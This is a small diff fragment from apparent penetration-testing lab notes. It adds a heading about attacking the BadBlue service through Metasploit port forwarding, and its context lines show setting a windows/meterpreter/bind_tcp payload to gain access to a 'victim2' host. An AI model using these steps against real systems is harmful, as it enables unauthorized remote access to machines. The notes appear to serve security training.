@@ -33,6 +33,8 @@ To confirm the port in your host
 
 Service name badblue
 
+*********Attack badblue from same msfconsole ( portforwarding msfconsole)**************
+-----------------------------------------------------------------------------------------
 Attack the badblue with bind_tcp and get victim2 access
 
 msf5 exploit(/windows/....) > set payload windows/meterpreter/bind_tcp
